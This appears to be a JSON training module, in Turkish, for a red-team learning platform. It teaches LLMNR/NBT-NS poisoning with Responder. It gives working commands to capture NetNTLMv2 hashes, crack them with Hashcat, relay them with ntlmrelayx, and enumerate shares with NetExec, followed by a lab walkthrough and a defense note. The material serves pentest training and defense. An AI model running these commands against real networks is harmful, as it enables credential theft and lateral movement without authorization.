@@ -1,0 +1,114 @@
+{
+  "id": "responder",
+  "slug": "responder",
+  "title": "Responder",
+  "subtitle": "LLMNR / NBT-NS Zehirleme",
+  "description": "Responder, yerel ağda LLMNR, NBT-NS ve mDNS ad çözümleme isteklerini zehirleyerek kullanıcıların kimlik doğrulama hash'lerini (NetNTLMv2) yakalayan bir araçtır.",
+  "team": "red-team",
+  "category": "Active Directory",
+  "phase": "Exploitation",
+  "icon": "📡",
+  "color": "#ef4444",
+  "tags": ["responder", "llmnr", "nbt-ns", "poisoning", "netntlmv2", "mitm", "hash"],
+  "modules": [
+    {
+      "id": "basics",
+      "title": "Temeller ve Hash Yakalama",
+      "description": "LLMNR/NBT-NS zehirleme mantığı ve temel kullanım",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "LLMNR/NBT-NS Zehirleme Nasıl Çalışır?",
+          "content": "**Senaryo:** Bir Windows cihazı DNS'in çözemediği bir isme erişmeye çalışır (örn. yanlış yazılmış paylaşım `\\\\fileserver`). Windows bu durumda ağa **LLMNR** ve **NBT-NS** ile 'fileserver kim?' diye yayın yapar.\n\n**Saldırı:** Responder bu yayına 'Ben fileserver'ım!' diye sahte yanıt verir. Kurban, kimlik doğrulamak için **NetNTLMv2 hash'ini** Responder'a gönderir.\n\n**Sonuç:** Yakalanan hash:\n- **Offline kırılabilir** (Hashcat -m 5600)\n- **Relay edilebilir** (ntlmrelayx ile başka sisteme)\n\n**Neden bu kadar etkili?** LLMNR/NBT-NS varsayılan olarak açıktır ve çoğu kurumda kapatılmamıştır.\n\n**İç ağ pentest ipucu:** İç ağa eriştiğinde ilk yapılacaklardan biri Responder'ı pasif modda dinlemeye almaktır — kullanıcı hash'leri zamanla akar."
+        },
+        {
+          "id": "installation",
+          "type": "installation",
+          "title": "Kurulum",
+          "installation": {
+            "note": "Kali'de yüklü gelir.",
+            "linux": ["sudo apt install responder -y", "# veya: git clone https://github.com/lgandx/Responder"]
+          }
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Temel Kullanım",
+          "commands": [
+            {
+              "command": "sudo responder -I eth0 -dwv",
+              "description": "eth0 arayüzünde zehirleme yaparak hash'leri yakala",
+              "output": "[+] Listening for events...\n[SMB] NTLMv2-SSP Hash : john::CORP:1122...",
+              "tip": "Yakalanan hash'ler /usr/share/responder/logs/ altına kaydedilir. Sonraki adım: Hashcat -m 5600 ile kır.",
+              "flags": [
+                { "flag": "-I", "description": "Ağ arayüzü (eth0/tun0)" },
+                { "flag": "-w", "description": "WPAD rogue proxy" },
+                { "flag": "-d", "description": "NBT-NS domain suffix yanıtı" },
+                { "flag": "-v", "description": "Ayrıntılı çıktı" }
+              ]
+            },
+            {
+              "command": "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
+              "description": "Yakalanan NetNTLMv2 hash'ini kır",
+              "tip": "5600 = NetNTLMv2 modu. Kırılan parola ile NetExec/CrackMapExec'e geç."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "advanced",
+      "title": "NTLM Relay ve Lab",
+      "description": "Hash relay saldırısı ve pratik senaryo",
+      "difficulty": "advanced",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "NTLM Relay",
+          "commands": [
+            {
+              "command": "# 1) Responder.conf'ta SMB ve HTTP'yi OFF yap\n# 2) Relay başlat:\nntlmrelayx.py -tf targets.txt -smb2support",
+              "description": "Yakalanan kimlik doğrulamayı SMB imzalaması kapalı hedeflere relay et",
+              "tip": "Relay, hash'i kırmadan doğrudan başka sisteme kimlik doğrular. Hedeflerde SMB signing kapalı olmalı.",
+              "warning": "Yalnızca yetkili iç ağ pentest/lab ortamında kullanılır."
+            },
+            {
+              "command": "netexec smb 10.10.10.0/24 --gen-relay-list targets.txt",
+              "description": "SMB imzalaması kapalı (relay'e uygun) hedefleri tespit et",
+              "tip": "Bu liste ntlmrelayx için ideal hedeflerdir."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: Hash Yakala ve Kullan",
+          "scenario": {
+            "title": "Zehirleme → Hash → Erişim",
+            "objective": "İç ağda Responder ile bir kullanıcının NetNTLMv2 hash'ini yakala, Hashcat ile kır ve elde edilen kimlik bilgisiyle ağda numaralandırma yap.",
+            "environment": "AD lab (GOAD) veya iç ağ pentest lab'ı",
+            "difficulty": "advanced",
+            "steps": [
+              "Responder'ı başlat: sudo responder -I eth0 -dwv",
+              "Kurban bir paylaşıma erişmeye çalışınca hash yakalanır (veya tetikle)",
+              "Hash'i kaydet, Hashcat ile kır: hashcat -m 5600 hash.txt rockyou.txt",
+              "Kırılan kimlikle: netexec smb HEDEF -u user -p 'parola' --shares",
+              "Erişim/yanal hareket ile devam et"
+            ],
+            "hints": [
+              "Relay için Responder'da SMB/HTTP sunucularını kapatmayı unutma",
+              "Kırılamayan hash'leri relay etmeyi dene",
+              "SMB signing zorunluysa relay çalışmaz — başka vektör ara"
+            ],
+            "defenseNote": "Savunma: LLMNR ve NBT-NS'yi GPO ile devre dışı bırak, SMB imzalamasını zorunlu kıl, ağ segmentasyonu uygula ve anormal ad çözümleme/kimlik doğrulamayı izle."
+          }
+        }
+      ]
+    }
+  ]
+}
